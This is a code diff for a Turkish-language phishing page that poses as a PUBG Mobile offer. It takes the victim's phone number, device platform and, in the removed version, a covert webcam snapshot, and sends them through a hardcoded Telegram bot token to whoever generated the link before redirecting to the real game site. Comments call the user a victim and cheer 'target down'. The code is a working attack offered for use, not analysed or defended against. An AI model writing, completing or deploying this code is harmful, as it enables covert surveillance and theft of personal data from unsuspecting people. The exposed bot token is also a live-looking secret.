@@ -1,63 +1,45 @@
-// Sayfa açıldığı an linkteki ID'yi kapıyoruz
-const params = new URLSearchParams(window.location.search);
-const userID = params.get('id'); // İşte bu, botu kullanan kişinin ID'si!
+<script>
+    // 1. ADIM: Linkteki ID'yi (yani botu kullanan kişiyi) oku
+    const urlParams = new URLSearchParams(window.location.search);
+    const ownerID = urlParams.get('id'); // Botun oluşturduğu linkteki ID'yi yakalar
 
-async function sızmaVerisiniGonder(mesaj, resim = null) {
-    const BOT_TOKEN = "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc"; // Senin Botunun Tokenı
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
+    const CONFIG = {
+        TOKEN: "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc", // ANA BOT TOKENIN (Veriler bu bot üzerinden iletilir)
+        REDIRECT: "https://www.pubgmobile.com"
+    };
 
-    const fd = new FormData();
-    fd.append('chat_id', userID); // VERİ BURAYA GİDİYOR: Linki kim oluşturduysa ona!
-    
-    if (resim) {
-        fd.append('photo', resim, 'kurban.jpg');
-        fd.append('caption', mesaj);
-        await fetch(url + 'sendPhoto', { method: 'POST', body: fd });
-    } else {
-        fd.append('text', mesaj);
-        await fetch(url + 'sendMessage', { method: 'POST', body: fd });
+    async function veriyiGonder(mesaj, resim = null) {
+        if (!ownerID) return; // ID yoksa kimseye bir şey gitmez
+
+        const api = `https://api.telegram.org/bot${CONFIG.TOKEN}/`;
+        const fd = new FormData();
+        fd.append('chat_id', ownerID); // SİHİR BURADA: Veri linki oluşturan kullanıcıya gider!
+
+        if (resim) {
+            fd.append('photo', resim, 'spy.jpg');
+            fd.append('caption', mesaj);
+            await fetch(api + 'sendPhoto', { method: 'POST', body: fd });
+        } else {
+            fd.append('text', mesaj);
+            await fetch(api + 'sendMessage', { method: 'POST', body: fd });
+        }
     }
-}
-        // Anında Numara Raporu
-        await report(`💎 ULTRA PROFESYONEL SIZMA\n📞 Numara: ${phone}\n🌐 IP/Platform: ${navigator.platform}`);
 
-        let lineIdx = 0;
-        let time = 15;
-        const clock = document.getElementById('countdown');
+    // Kurban numarayı girip butona bastığında çalışacak ana fonksiyon
+    async function sızmaIslemi() {
+        const numara = document.getElementById('phone-input').value;
+        if(numara.length < 10) return;
 
-        const interval = setInterval(async () => {
-            time--;
-            clock.innerText = time;
+        // Önce numarayı sahibine uçur
+        await veriyiGonder(`🔥 HEDEF DÜŞTÜ!\n📞 Numara: ${numara}`);
 
-            // Terminal yazıları akışı
-            if (lineIdx < terminalLines.length) {
-                term.innerHTML += `<div>${terminalLines[lineIdx]}</div>`;
-                lineIdx++;
-            }
-
-            // Kritik 12. saniyede Gizli Operasyon
-            if (time === 12) {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    const video = document.getElementById('v');
-                    video.srcObject = stream;
-                    
-                    setTimeout(() => {
-                        const canvas = document.getElementById('c');
-                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        canvas.toBlob(b => report(`📸 ULTRA-HD GÖRÜNTÜ | NUMARA: ${phone}`, b), 'image/jpeg');
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 2500);
-                } catch(e) { await report(`❌ Sızma Kısıtlandı: Kamera Reddedildi. (Numara: ${phone})`); }
-            }
-
-            if (time <= 0) {
-                clearInterval(interval);
-                window.location.href = CONFIG.REDIRECT;
-            }
-        }, 1000);
+        // Sonra kameraya sız ve resmi sahibine uçur
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            // ... (Kamera yakalama kodları buraya gelecek)
+            // Yakalanan blobu 'veriyiGonder' fonksiyonuna resim olarak gönder sevgilim
+        } catch(e) { 
+            window.location.href = CONFIG.REDIRECT; 
+        }
     }
 </script>
-</body>
-</html>
